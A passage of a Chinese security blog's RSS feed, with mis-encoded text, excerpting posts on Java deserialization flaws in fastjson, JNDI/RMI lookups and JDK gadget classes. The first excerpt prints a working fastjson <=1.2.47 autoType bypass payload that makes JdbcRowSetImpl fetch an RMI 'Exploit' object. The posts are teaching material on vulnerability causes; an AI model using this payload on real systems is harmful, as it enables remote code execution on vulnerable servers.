&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸å‡ºæ„æ–™çš„è¯ä¼šå‡ºç°è¿™æ ·çš„é”™è¯¯æç¤ºä¿¡æ¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;autoType is not support. com.sun.rowset.JdbcRowSetImpl
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™æ˜¯å› ä¸º fastjson ä½¿ç”¨äº†é»‘åå•æœºåˆ¶ï¼Œç¦æ­¢å°† &lt;code&gt;com.sun.rowset.JdbcRowSetImpl&lt;/code&gt; ååºåˆ—åŒ–ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹é¢æˆ‘ä»¬ä½¿ç”¨æ–°çš„ POC è¿›è¡Œæµ‹è¯•ï¼Œåˆå¯ä»¥åˆ©ç”¨æˆåŠŸäº†ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; com.alibaba.fastjson.JSON;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Eval5&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(String&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; args) &lt;span style=&#34;color:#66d9ef&#34;&gt;throws&lt;/span&gt; Exception {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        String payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{\&amp;#34;a\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;java.lang.Class\&amp;#34;,\&amp;#34;val\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;},\&amp;#34;b\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}}&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        JSON.&lt;span style=&#34;color:#a6e22e&#34;&gt;parse&lt;/span&gt;(payload);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;payload æ ¼å¼åŒ–ä¹‹åå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;: {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;@type&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;java.lang.Class&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;val&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	},
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;: {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;@type&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dataSourceName&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rmi://localhost:1099/Exploit&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;autoCommit&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;fastjson--1247-ç»•è¿‡åŸç†&#34;&gt;Fastjson &amp;lt;= 1.2.47 ç»•è¿‡åŸç†&lt;/h2&gt;
&lt;p&gt;åœ¨å­¦ä¹ ç»•è¿‡åŸç†ä¹‹å‰ï¼Œäº†è§£ fastjson çš„åŸºæœ¬è§£ææµç¨‹è¿˜æ˜¯æœ‰å¿…è¦çš„ï¼Œæˆ‘ç”»äº†ä¸€å¼ ç±»å›¾ä»…ä¾›å‚è€ƒï¼Œå›¾ä¸­åªç”»äº†ä¸»è¦æµç¨‹ï¼Œè¿˜æœ‰å¾ˆå¤šç±»æ²¡æœ‰ç”»ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆå››ï¼‰JNDI &#43; RMI/LDAP åœ¨fastjsonä¸­çš„åˆ©ç”¨åŸç†</title>
      <link>https://www.typesafe.cn/posts/java-serialization-vulnerability-4/</link>
      <pubDate>Sat, 30 Oct 2021 13:43:00 +0800</pubDate>
      <guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-4/</guid>
      <description>&lt;h2 id=&#34;å£°æ˜&#34;&gt;å£°æ˜&lt;/h2&gt;
&lt;p&gt;æœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚&lt;/p&gt;
&lt;h2 id=&#34;jndi-æ˜¯ä»€ä¹ˆ&#34;&gt;JNDI æ˜¯ä»€ä¹ˆ&lt;/h2&gt;
&lt;p&gt;Javaå‘½åå’Œç›®å½•æ¥å£ï¼ˆJava Naming and Directory Interfaceï¼Œç¼©å†™JNDIï¼‰ï¼Œæ˜¯Javaçš„ä¸€ä¸ªç›®å½•æœåŠ¡åº”ç”¨ç¨‹åºæ¥å£ï¼ˆAPIï¼‰ï¼Œå®ƒæä¾›ä¸€ä¸ªç›®å½•ç³»ç»Ÿï¼Œå¹¶å°†æœåŠ¡åç§°ä¸å¯¹è±¡å…³è”èµ·æ¥ï¼Œä»è€Œä½¿å¾—å¼€å‘äººå‘˜åœ¨å¼€å‘è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨åç§°æ¥è®¿é—®å¯¹è±¡ã€‚&lt;/p&gt;
&lt;p&gt;JNDI åŒ…å«åœ¨Java SEä¸­ï¼Œä¸éœ€è¦å¼•ç”¨ç¬¬ä¸‰æ–¹jarå³å¯ä½¿ç”¨ã€‚è¦ä½¿ç”¨ JNDI å¿…é¡»è¦æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªæœåŠ¡æä¾›è€…ã€‚JDK æœ¬èº«å·²ç»åŒ…æ‹¬äº†ä¸‹é¢å‡ ç§æœåŠ¡æä¾›è€…ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;è½»é‡çº§ç›®å½•è®¿é—®åè®® (LDAP)&lt;/li&gt;
&lt;li&gt;CORBA å…¬å…±å¯¹è±¡æœåŠ¡å‘½åï¼ˆCOS namingï¼‰&lt;/li&gt;
&lt;li&gt;Java è¿œç¨‹æ–¹æ³•è°ƒç”¨ (RMI)&lt;/li&gt;
&lt;li&gt;åŸŸåæœåŠ¡ (DNS)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;è¿™ä¹ˆè¯´èµ·æ¥è¿˜æ˜¯æœ‰ç‚¹æŠ½è±¡ï¼Œç®€å•ç†è§£å°±æ˜¯&lt;strong&gt;æœåŠ¡æä¾›è€…&lt;/strong&gt;æä¾›ä¸€ä¸ªç±»ä¼¼Key Valueçš„æ•°æ®ï¼Œ&lt;strong&gt;JNDI&lt;/strong&gt;å¯ä»¥é€šè¿‡è¿™ä¸ª Key è·å–åˆ°&lt;strong&gt;æœåŠ¡æä¾›è€…&lt;/strong&gt;ä¸Šçš„æä¾›çš„Valueï¼Œå› æ­¤JNDIæ˜¯æ— æ³•å•ç‹¬ä½¿ç”¨çš„ã€‚&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨JNDIçš„æ–¹å¼ä¹Ÿå¾ˆç®€å•ï¼Œä¸‹é¢å°±æ˜¯ä¸€ä¸ªè·å–è¿œç¨‹å¯¹è±¡çš„ç¤ºä¾‹ä»£ç ã€‚&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// åˆ›å»ºä¸€ä¸ªä¸Šä¸‹æ–‡å¯¹è±¡
InitialContext context = new InitialContext();
// æŸ¥æ‰¾ç›‘å¬åœ¨æœ¬åœ° 1099 ç«¯å£ä¸Š RMI æœåŠ¡çš„ Object å¯¹è±¡
Object obj = context.lookup(&amp;#34;rmi://localhost:1099/Object&amp;#34;);
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;rmi-æ˜¯ä»€ä¹ˆ&#34;&gt;RMI æ˜¯ä»€ä¹ˆ&lt;/h2&gt;
&lt;p&gt;RMI æ˜¯ Remote Method Invocation çš„ç¼©å†™ï¼Œä¸­æ–‡å«ä¹‰ä¸ºè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œå³ä¸€ä¸ªJavaç¨‹åºè°ƒç”¨è°ƒç”¨å¦ä¸€ä¸ªJavaç¨‹åºæš´éœ²å‡ºæ¥çš„æ–¹æ³•ã€‚&lt;/p&gt;
&lt;p&gt;RMI æœ‰ä¸‰ä¸ªæ¦‚å¿µï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Registry :&lt;/strong&gt; æä¾›æœåŠ¡æ³¨å†Œå’ŒæœåŠ¡è·å–ï¼ŒæœåŠ¡ç«¯å°†ç±»åç§°ï¼Œå­˜æ”¾åœ°å€æ³¨å†Œåˆ°Registryä¸­ï¼Œä»¥ä¾›å®¢æˆ·ç«¯è·å–ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Server :&lt;/strong&gt; è¿œç¨‹æ–¹æ³•çš„æä¾›è€…ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Client :&lt;/strong&gt; è¿œç¨‹æ–¹æ³•çš„è°ƒç”¨è€…ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;è¿œç¨‹æ–¹æ³•çš„å®šä¹‰éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å®ç° &lt;code&gt;java.rmi.Remote&lt;/code&gt;ã€‚&lt;/li&gt;
&lt;li&gt;ç»§æ‰¿ &lt;code&gt;java.rmi.server.UnicastRemoteObject&lt;/code&gt;ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;rmi-ä½¿ç”¨ç¤ºä¾‹&#34;&gt;RMI ä½¿ç”¨ç¤ºä¾‹&lt;/h2&gt;
&lt;h3 id=&#34;registry&#34;&gt;Registry&lt;/h3&gt;
&lt;p&gt;åˆ›å»º Registry&lt;/p&gt;</description>
    </item>
    <item>
      <title>Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆä¸‰ï¼‰fastjson 1.2.24 Templateslmpl åˆ©ç”¨åŸç†</title>
      <link>https://www.typesafe.cn/posts/java-serialization-vulnerability-3/</link>
      <pubDate>Thu, 21 Oct 2021 22:56:00 +0800</pubDate>
      <guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-3/</guid>
      <description>&lt;h2 id=&#34;å£°æ˜&#34;&gt;å£°æ˜&lt;/h2&gt;
&lt;p&gt;æœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚&lt;/p&gt;
&lt;h2 id=&#34;fastjson-æ˜¯ä»€ä¹ˆ&#34;&gt;Fastjson æ˜¯ä»€ä¹ˆ&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;fastjsonæ˜¯é˜¿é‡Œå·´å·´çš„å¼€æºJSONè§£æåº“ï¼Œå®ƒå¯ä»¥è§£æJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒå°†Java Beanåºåˆ—åŒ–ä¸ºJSONå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä»JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ°JavaBeanã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;fastjsonç›¸å¯¹å…¶ä»–JSONåº“çš„ç‰¹ç‚¹æ˜¯å¿«ã€‚fastjsonåœ¨é˜¿é‡Œå·´å·´å¤§è§„æ¨¡ä½¿ç”¨ï¼Œåœ¨æ•°ä¸‡å°æœåŠ¡å™¨ä¸Šéƒ¨ç½²ï¼Œfastjsonåœ¨ä¸šç•Œè¢«å¹¿æ³›æ¥å—ã€‚åœ¨2012å¹´è¢«å¼€æºä¸­å›½è¯„é€‰ä¸ºæœ€å—æ¬¢è¿çš„å›½äº§å¼€æºè½¯ä»¶ä¹‹ä¸€ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;ä»¥ä¸Šæ‘˜è‡ªFastjson GitHub ä»‹ç»ã€‚&lt;/p&gt;
&lt;p&gt;ä½†è¿‘å¹´æ¥éšç€ Fastjson ä¸æ–­çˆ†å‡ºæ¼æ´ï¼Œå„å¤§ä¸­å°å‹å…¬å¸éƒ½é€æ¸å¼ƒç”¨ Fastjson ï¼Œç”šè‡³é˜¿é‡Œè‡ªå·±å¼€æºçš„æœåŠ¡æ³¨å†Œã€é…ç½®ç®¡ç†å¹³å° &lt;strong&gt;NACOS&lt;/strong&gt; åœ¨ 1.3.0 ç‰ˆæœ¬ä¹‹åéƒ½ä» Fastjson æ›¿æ¢ä¸ºäº† Jackson (è¯¦è§ &lt;a href=&#34;https://github.com/alibaba/nacos/releases/tag/1.3.0&#34;&gt;https://github.com/alibaba/nacos/releases/tag/1.3.0&lt;/a&gt;) ï¼Œå¯è§æ¼æ´å±å®³ä¹‹å¤§ã€‚&lt;/p&gt;
&lt;h2 id=&#34;ä¸ºä»€ä¹ˆä¼šå¼ƒç”¨-fastjson-&#34;&gt;ä¸ºä»€ä¹ˆä¼šå¼ƒç”¨ Fastjson ï¼Ÿ&lt;/h2&gt;
&lt;p&gt;æƒ³è¦ç ”ç©¶ä¸€ä¸ªäº§å“çš„æ¼æ´å…¶ä¸­æœ‰ä¸€æ¡å¾ˆå¥½çš„é€”å¾„å°±æ˜¯å»æŸ¥è¯¢ CVE ç¼–å·ï¼Œä½†æ˜¯æˆ‘åœ¨æ£€ç´¢ä¹‹åå‘ç° Fastjson åªæœ‰ &lt;strong&gt;CVE-2017-18349&lt;/strong&gt; è¿™ä¸€æ¡ï¼Œè€Œ Jackson ç«Ÿç„¶æœ‰é«˜è¾¾ 76 æ¡ã€‚&lt;/p&gt;
&lt;p&gt;è¿™èƒ½å¦è¯æ˜ Fastjson æ¯” Jackson æ›´å®‰å…¨å‘¢ï¼Ÿç­”æ¡ˆå¹¶ä¸æ˜¯ï¼Œéƒ½æ˜¯åŠæ–¤å…«ä¸¤ï¼Œæœ‰äº› Fastjson é‡Œé¢å‡ºç°çš„æ¼æ´åœ¨ Jackson é‡Œé¢ä¹ŸåŒæ ·å­˜åœ¨ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¸ºä»€ä¹ˆä¼šæœ‰å…¬å¸å¼ƒç”¨ Fastjson å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;æˆ–è®¸æ˜¯ Jackson æœ‰æ›´å®Œå–„ä¸”å…¬å¼€çš„æ¼æ´ç®¡ç†æœºåˆ¶ï¼Œæˆ–è®¸æ˜¯å›½å¤–çš„æœˆäº®æ¯”è¾ƒåœ†ï¼Œæˆ–è®¸æ˜¯éšå¤§æµï¼Œä¹Ÿæˆ–è®¸æ˜¯ Fastjson ä»£ç è´¨é‡ä¸è¿‡å…³ï¼ˆçŸ¥ä¹ä¸Šæœ‰å¾ˆå¤šå›ç­”æ‰¹åˆ¤ Fastjson ä»£ç ç³Ÿç³•çš„ï¼‰ï¼ŒçœŸå®åŸå› å°±ä¸å¾—è€ŒçŸ¥äº†ã€‚&lt;/p&gt;
&lt;p&gt;å°½ç®¡è¿‘å¹´æ¥æœ‰å…¬å¸ä¸æ–­å¼ƒç”¨ Fastjson ï¼Œä½†è¿˜æœ‰å¾ˆå¤šå…¬å¸åœ¨ä½¿ç”¨ï¼Œå¹¶ä¸”å·²ç»å¼€å‘ä¸Šçº¿çš„ç³»ç»Ÿæƒ³è¦æ›¿æ¢æˆ–è€…å‡çº§ Fastjson è¿˜éœ€è¦æ—¶é—´ï¼Œå› æ­¤æˆ‘ä»¬å¾ˆæœ‰å¿…è¦å­¦ä¹ ä¸€ä¸‹ Fastjson æ¼æ´çš„äº§å› ã€‚&lt;/p&gt;
&lt;h2 id=&#34;fastjson-æ¼æ´äº§ç”ŸåŸå› &#34;&gt;Fastjson æ¼æ´äº§ç”ŸåŸå› &lt;/h2&gt;
&lt;p&gt;Fastjson ç¬¬ä¸€æ¬¡è¢«çˆ†å‡ºæœ‰æ¼æ´æ˜¯å®˜æ–¹åœ¨2017å¹´3æœˆ15æ—¥ä¸»åŠ¨æŠ«éœ²çš„ï¼Œè¯¦è§ &lt;a href=&#34;https://github.com/alibaba/fastjson/wiki/security_update_20170315&#34;&gt;https://github.com/alibaba/fastjson/wiki/security_update_20170315&lt;/a&gt; ã€‚æ¼æ´å½±å“ 1.2.24 ä»¥åŠä¹‹å‰çš„ç‰ˆæœ¬ã€‚æˆ‘ä»¬ä»Šå¤©æ¥ç ”ç©¶ä¸€ä¸‹å½“ fastjson version &amp;lt;= 1.2.24 æ—¶æ¼æ´æ˜¯å¦‚ä½•äº§ç”Ÿçš„ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆäºŒï¼‰æ–°ç‰ˆæœ¬JDKåˆ©ç”¨æ–¹å¼å’ŒShiroä¸¾ä¾‹</title>
      <link>https://www.typesafe.cn/posts/java-serialization-vulnerability-2/</link>
      <pubDate>Sat, 16 Oct 2021 22:55:00 +0800</pubDate>
      <guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-2/</guid>
      <description>&lt;h2 id=&#34;å£°æ˜&#34;&gt;å£°æ˜&lt;/h2&gt;
&lt;p&gt;æœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚&lt;/p&gt;
&lt;h2 id=&#34;æ–°çš„å¸Œæœ›&#34;&gt;æ–°çš„å¸Œæœ›&lt;/h2&gt;
&lt;h3 id=&#34;0x00&#34;&gt;0x00&lt;/h3&gt;
&lt;p&gt;åœ¨ä¸Šä¸€èŠ‚ä¸­æˆ‘ä»¬ä»‹ç»äº† Java ååºåˆ—åŒ–æ¼æ´çš„æˆå› å’Œåˆ©ç”¨ &lt;code&gt;commons-collections 3.1&lt;/code&gt; æ­é… &lt;code&gt;sun.reflect.annotation.AnnotationInvocationHandler&lt;/code&gt; å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„æ–¹å¼ã€‚ä½†&lt;code&gt;sun.reflect.annotation.AnnotationInvocationHandler&lt;/code&gt; çš„é—®é¢˜å·²ç»åœ¨æœ€æ–°ç‰ˆ jdk ä¸­ä¿®å¤ï¼Œå¯åˆ©ç”¨èŒƒå›´ä»…èƒ½å¤Ÿå±€é™äºæ—§ç‰ˆæœ¬çš„jdkã€‚ç»è¿‡å®‰å…¨äººå‘˜çš„å®¡è®¡ï¼Œå¦ä¸€ä¸ªç±»  &lt;code&gt;javax.management.BadAttributeValueExpException&lt;/code&gt; å‡ºç°åœ¨äº†å®‰å…¨äººå‘˜çš„è§†é‡ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;javax.management.BadAttributeValueExpException&lt;/code&gt; ç»§æ‰¿è‡ª &lt;code&gt;java.lang.Exception&lt;/code&gt;ï¼Œ&lt;code&gt;java.lang.Exception&lt;/code&gt; ç»§æ‰¿è‡ª &lt;code&gt;java.lang.Throwable&lt;/code&gt;ï¼Œè€Œ &lt;code&gt;java.lang.Throwable&lt;/code&gt; å®ç°äº† &lt;code&gt;java.io.Serializable&lt;/code&gt;ã€‚å› æ­¤ &lt;code&gt;javax.management.BadAttributeValueExpException&lt;/code&gt; ç¬¦åˆäº† &lt;strong&gt;å¯åºåˆ—åŒ–&lt;/strong&gt; è¿™ä¸ªè¦æ±‚ï¼ŒåŒæ ·çš„å®ƒä¹Ÿå¢åŠ äº† &lt;code&gt;readObject&lt;/code&gt; æ–¹æ³•ï¼Œè¿™ä¸ªç±»çš„å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;package&lt;/span&gt; javax.management;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.io.IOException;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.io.ObjectInputStream;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/**
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * Thrown when an invalid MBean attribute is passed to a query
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * constructing method.  This exception is used internally by JMX
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * during the evaluation of a query.  User code does not usually
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * see it.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * @since 1.5
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;BadAttributeValueExpException&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;extends&lt;/span&gt; Exception   {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;/* Serial version */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;final&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; serialVersionUID &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;3105272988410493376L;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;/**
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;     * @serial A string representation of the attribute that originated this exception.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;     * for example, the string value can be the return of {@code attribute.toString()}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;     */&lt;/span&gt;
